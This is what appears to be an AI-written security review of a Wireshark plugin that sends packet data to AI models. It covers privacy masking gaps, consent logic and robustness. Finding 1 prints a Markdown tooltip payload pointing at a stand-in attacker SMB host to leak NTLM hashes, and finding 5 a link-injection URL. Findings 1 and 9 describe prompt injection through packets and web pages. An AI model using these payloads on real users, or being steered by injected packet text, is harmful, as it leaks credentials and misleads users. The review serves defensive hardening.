# SmartShark pre-release security review (2026-11-21)

**Reviewed by:** Fable 5.2 (model ID `claude-fable-5-2`), an AI model by Anthropic, working as an independent reviewer. It was given the source code and a threat list, not the conclusions of earlier reviews.
**Commit reviewed:** `3203d5c` (branch main).
**Date:** 2026-11-21.

This is the reviewer's report as delivered, lightly shortened for publication. It is an AI review, not a paid third-party audit. Every finding was fixed or answered before the first release; see [SECURITY.md](../SECURITY.md) for what changed.

## Summary

No critical or high-severity issue found. The design is sound: API keys live only in Credential Manager and travel only in headers, there is no logging, TLS verification is left at Qt's defaults, backend redirects are same-origin, consent is re-checked against the same settings snapshot the backend is built from, and model text is rendered with HTML off and resource loading blocked.

Two medium issues should be fixed before release:

1. A Markdown link *title* in model output becomes an HTML tooltip that loads files on hover. On Windows this allows an SMB/NTLM-hash leak.
2. Address hiding misses some MAC forms that Wireshark really emits, although the UI and README say it covers every device's MAC.

The rest are low-severity privacy and logic gaps, robustness against a hostile server, and several README sentences that claim more than the code delivers.

Both medium issues and finding 5 were confirmed by compiling the plugin's own sources into a small Qt 6.9.3 test program (offscreen).

## Findings

| # | Severity | Title | Status |
|---|---|---|---|
| 1 | Medium | Link titles in model output become rich-text tooltips that load local/UNC files on hover | Confirmed dynamically |
| 2 | Medium | Address hiding misses MA-M/MA-S vendor short names and unseparated hex MACs | Confirmed dynamically and against Wireshark 4.6.0 source |
| 3 | Low | Turning on address hiding mid-conversation does not apply, but the consent text says it does | Confirmed by code reading |
| 4 | Low | "My public IP" only covers adapter addresses; lookup facts and reversed/dashed forms of a hidden address still go out | Confirmed (masker behaviour tested) |
| 5 | Low | Sources list: an unescaped URL can inject a second link under another site's host label | Confirmed dynamically |
| 6 | Low | A hostile or compromised server can freeze Wireshark (no text cap on the Anthropic path, quadratic work, uncapped filter and error text) | Code reading; not load-tested |
| 7 | Low | A stored API key follows the provider id, not the host | Confirmed by code reading |
| 8 | Low | Packet data may go over plain http to non-loopback hosts; "local" wording and labels overstate | Confirmed by code reading |
| 9 | Info | Prompt injection is reduced, not prevented | Design limit |
| 10 | Info | Online lookups: cross-host redirects, own address looked up, Wireshark's own resolver | Code reading |
| 11 | Info | Release and supply chain: no checksums, signing or pinned inputs yet | Process |
| 12 | Info | Two published screenshots carry the committer's name and timestamps in EXIF/XMP | Confirmed |

### 1. Medium: link titles become rich-text tooltips that load files on hover

**Where:** `plugin/ui/collapsible_section.cpp` (`SafeMarkdownView`).

`SafeMarkdownView` disables raw HTML and overrides `loadResource`, which does block images in the body. But Qt's Markdown importer copies a link's title into the character format's tooltip, and the view keeps text interaction on, so Qt shows that tooltip through `QToolTip`. The tooltip label auto-detects rich text and uses its own document, which the `loadResource` override does not cover.

**Scenario:** the model's reply contains

```
[details](https://example.com "<img src='file://attacker.example/s/x.png'>")
```

This can come from a hostile or compromised server directly, or from prompt injection in a packet or a searched web page. When the user moves the mouse over "details", Qt opens the UNC path. Windows then authenticates to the attacker's SMB host and discloses the user's NetNTLMv2 hash (offline cracking or relay). No click is needed. There is no code execution.

**Evidence:** in a test program, `charFormat().toolTip()` held the `<img>` tag, the tooltip became visible after a `QEvent::ToolTip`, and the tooltip's size matched a local probe image, so the file was opened. Tested with a local file, not a real UNC host; UNC goes through the same file-open path.

**Recommended fix:** clear `QTextFormat::TextToolTip` on every fragment after `setMarkdown`, and/or swallow `QEvent::ToolTip`. Add a unit test. Correct the README.

### 2. Medium: address hiding misses real MAC forms

**Where:** `plugin/core/privacy.cpp` (the MAC patterns).

The vendor short-name pattern only matches `Name_xx:xx:xx`. Wireshark 4.6.0 (`eth_resolved_name_fill` in `epan/addr_resolv.c`) also emits `Name_x:xx:xx` for 28-bit vendor blocks and `Name_x:xx` for 36-bit blocks, which are common for small IoT and industrial vendors.

Test output with hiding on:

```
Src: SmallVendor_1:23:45 (8c:1f:64:a1:23:45)  ->  Src: SmallVendor_1:23:45 (MAC-2)
Src: TinyVendor_1:23 (8c:1f:64:12:31:23)      ->  Src: TinyVendor_1:23 (MAC-3)
Client hardware address: 0800274e66a1         ->  unchanged
0000  08 00 27 4e 66 a1 ...                   ->  unchanged
```

**Consequence:** the vendor block name plus the remaining bits identifies the device, and this goes to the cloud provider although the user ticked "Hide MAC addresses". MACs printed as unseparated hex in dissection fields are also missed. The README says the option "covers every device's MAC address".

**Recommended fix:** generalise the short-name pattern; better, replace every textual form of each MAC address seen. Until then, soften the claim.

### 3. Low: hiding turned on mid-conversation is not applied, but the consent text says it is

**Where:** the follow-up paths in `investigation_panel.cpp`, `capture_panel.cpp` and `research_panel.cpp`; `cloud_consent.cpp`.

The masking choice is fixed when the first message is built. Follow-ups resend the stored messages.

**Scenario:** explain a packet with a local model and hiding off. Switch to a cloud provider and tick the hide box. Ask a follow-up. The original unmasked packet message is sent to the cloud provider, while the consent question says addresses are replaced before sending.

**Recommended fix:** on each follow-up, compare the current masking setting with the one the conversation started with; re-mask or require a fresh explanation. Build the consent text from what will actually be sent.

### 4. Low: "my public IP" is narrower than the label suggests

**Where:** `cloud_consent.cpp`, `privacy.cpp`, `ip_facts.cpp`.

- Own addresses come only from the computer's network adapters. Behind a NAT router (the usual home case) the public IPv4 address is on no adapter, so it is not hidden where it appears in traffic (STUN, UPnP, "what is my IP" replies, DDNS updates).
- For an address that is hidden, related text still goes out: reversed `in-addr.arpa` names and dashed forms in host names pass unchanged. With lookups allowed, the reverse-DNS name and registry block for the user's own address are added to the prompt.

**Recommended fix:** say plainly that only adapter addresses are covered; offer a way to add more addresses; skip lookup facts for own addresses when hiding is on; mask reversed and dashed forms.

### 5. Low: Sources list link injection and host-label spoofing

**Where:** `plugin/core/research.cpp` (`sourcesMarkdown`).

The URL is inserted into a Markdown link with `(`, `)`, `[` and `]` unescaped. A result URL such as `https://trusted.example/search?q=)[Click](https://evil.example/` renders a second link, "Click", under the label "(trusted.example)". If the attacker also gets that URL into the result set, a click opens it.

**Impact:** limited to opening an http(s) page in the browser under a misleading host label. It needs a hostile endpoint or a crafted search-result URL.

**Recommended fix:** use `<url>` link destinations and percent-encode `( ) [ ] < >`.

### 6. Low: a hostile or compromised server can freeze Wireshark

Only the configured server can trigger these; TLS prevents a network attacker from doing so.

- The 200,000-character reply cap exists only on the OpenAI-compatible path. The Anthropic paths accept text up to the 64 MiB stream limit; the panel re-render and the content accumulator are quadratic in reply length.
- `SseParser::feed` rescans its whole buffer when no newline has arrived.
- Server error messages (up to 4 MiB) are shown unshortened.
- `takeTag` compiles a regular expression per line and per tag.
- A model-supplied filter of any length is passed to Wireshark's filter compiler; the length cap is enforced only by the line edit.
- The 10-minute limit is per request, so a research turn with two resumes can run for 30 minutes.

**Recommended fix:** apply the reply cap on all Anthropic paths, cap reasoning, searches and sources, truncate error text, reject over-long filters before compiling, make the tag expressions static, remember the scan offset in the SSE parser.

### 7. Low: a stored API key follows the provider id, not the host

**Where:** `backend_factory.h`, `settings.cpp`, `settings_dialog.cpp`.

The key is loaded by provider id and sent to whatever base URL is configured. Changing the "custom" entry's URL from server A to server B sends A's key to B on the next request or on **Fetch models**, without notice. A preset's URL can also be overridden.

**Recommended fix:** store the host with the key; when the host differs, ask first or clear the key.

### 8. Low: plain http for packet data, and "local" claims

**Where:** `input_guard.cpp`, `privacy.cpp`, `settings_dialog.cpp`.

- The http restriction applies only when a key is set. A key-less server at a public `http://` address receives packet data unencrypted; the cloud question does not mention the missing encryption.
- Servers on private addresses and local names get no question. Reasonable, but "nothing leaves your computer" is not literally true.
- `*.localhost` names are treated as loopback for the key-over-http rule, which relies on the resolver.
- The Settings help text "Runs on this computer" is chosen by the preset, not by the URL actually entered (labelling only; consent uses the real URL).

**Recommended fix:** warn about http to non-private hosts; mention "unencrypted" in the consent text; derive the help text from the URL; limit the loopback exception to `localhost` and literal loopback addresses.

### 9. Info: prompt injection is reduced, not prevented

Packet text, DNS names, reverse-DNS names, registry records and web pages reach the model inside tagged blocks with a clear system prompt, and closing tags are neutralised. This lowers the success rate but cannot guarantee it: a crafted packet can still make the model give a wrong verdict or misleading advice. The exfiltration surface is small: no fetch tool, only Anthropic's server-side web search (at most five queries), model output cannot open links, and the model cannot trigger lookups.

Hardening: neutralise all tag names in every block; pass the `Source:`/`Destination:` lines through the same neutralising; remind users that answers are based on untrusted traffic.

### 10. Info: online lookups

- RDAP requests follow cross-host redirects (no credentials, 512 KB cap, 8 s timeout). Fine, but the README's "Redirects to other hosts are not followed" should exclude it.
- Lookups run only after consent. No path performs them without it.
- Wireshark's own name resolution can make DNS queries only if the user enabled it in Wireshark.

### 11. Info: release and supply chain

- The scripts run nothing elevated and quote paths. Nit: an `echo` in `install.cmd` breaks on a build path containing `)` or `&` (developer-only).
- The stock Wireshark 4.6.0 install ships the Qt network and TLS plugins the DLL needs.
- The build guide uses unpinned tool downloads.
- For the release: build from a tagged commit, publish SHA-256 checksums, state the exact Wireshark and Qt versions, include LICENSE and a source link, tell users a plugin runs with Wireshark's full rights, add a private vulnerability reporting route.

### 12. Info: screenshot metadata

Two README screenshots contain EXIF/XMP creator name and capture times. Hygiene only; strip if unwanted.

## Areas reviewed with no issues found

- **Body rendering:** raw HTML is shown literally and body images are blocked (both tested). All labels showing model or server text are plain text.
- **Network-derived table cells:** escaped; the "Sent to the AI" and raw-data views are fenced code blocks that cannot be broken out of.
- **Link opening:** only the Sources section is clickable, only for URLs from the results, only http(s), only on click (apart from finding 5).
- **Consent coverage:** every packet-data send path checks consent on fresh settings and builds the backend from that same snapshot. Approvals are keyed by provider and host. Cancel sends nothing. Stop aborts the connection.
- **"Sent to the AI":** shows the exact first user message as sent, after masking (not the system prompt or later turns).
- **Secrets:** the key is read from Credential Manager and sent only as a header; never in a URL, the settings file, error text or a log (there is no logging). Header injection is not possible. Residual: any process running as the user can read generic credentials.
- **Network:** no TLS overrides, same-origin redirects for model servers, strict URL validation, size limits, inactivity timeout and stream deadline.
- **JSON and SSE parsing:** malformed input leads to error results, not crashes.
- **Local-server detection:** odd host forms are normalised before classification (`http://134744072/v1` is 8.8.8.8, not local; `localhost.evil.example` is not local).
- **Lifetime and reentrancy:** backends are children of their panels and cancelled in destructors; callbacks are bound to the backend; cancellation from callbacks is handled; no worker threads; nested event loops are guarded.
- **Wireshark integration:** bounded buffers, clamped copies, matching allocators, tap registered and removed around a synchronous retap, incomplete scans rejected, stats tables capped, filters compiled by Wireshark and re-validated before apply.
- **Prompt construction:** user input is single-line and capped; tree and payload are capped by settings.
- **Scripts:** no elevation, no downloads, quoted paths.

## Documentation claims found wrong or overstated

1. "Nothing in them can run code, load images or files, or open links by itself" (false until finding 1 was fixed).
2. "This covers every device's MAC address" (finding 2).
3. "My public IP": only addresses on this computer's adapters are covered (finding 4).
4. "Text inside a packet cannot give it instructions" (overclaim; finding 9).
5. "Nothing leaves your computer" for local servers (servers on the local network count as local; lookups go out if allowed).
6. "Shows exactly what will be sent" in the consent question (it lists categories; the exact text appears afterwards).
7. "Redirects to other hosts are not followed" (not true for RDAP lookups).
8. "Oversized replies are cut off" (not on the Anthropic path; finding 6).
9. "Sent to the AI shows exactly what went out" (first message only; finding 3).

Claims checked and found accurate: key storage, no key over http except to this computer, the per-feature list of what is sent, lookups opt-in and address-only, filters validated before apply, at most five searches, sources opened only on click.

## Limits of this review

- Static review plus one small offscreen Qt test program (tooltip, masker, sources list, URL classification). No testing inside a running Wireshark, no live provider traffic, no fuzzing, no sanitizer runs.
- Finding 1 was shown with a local file, not a real SMB connection.
- Finding 6 comes from code reading; freeze times were not measured.
- Not reviewed: Qt and Wireshark themselves, proxy behaviour, the license text.
- How often prompt injection succeeds against a given model cannot be assessed by code review.
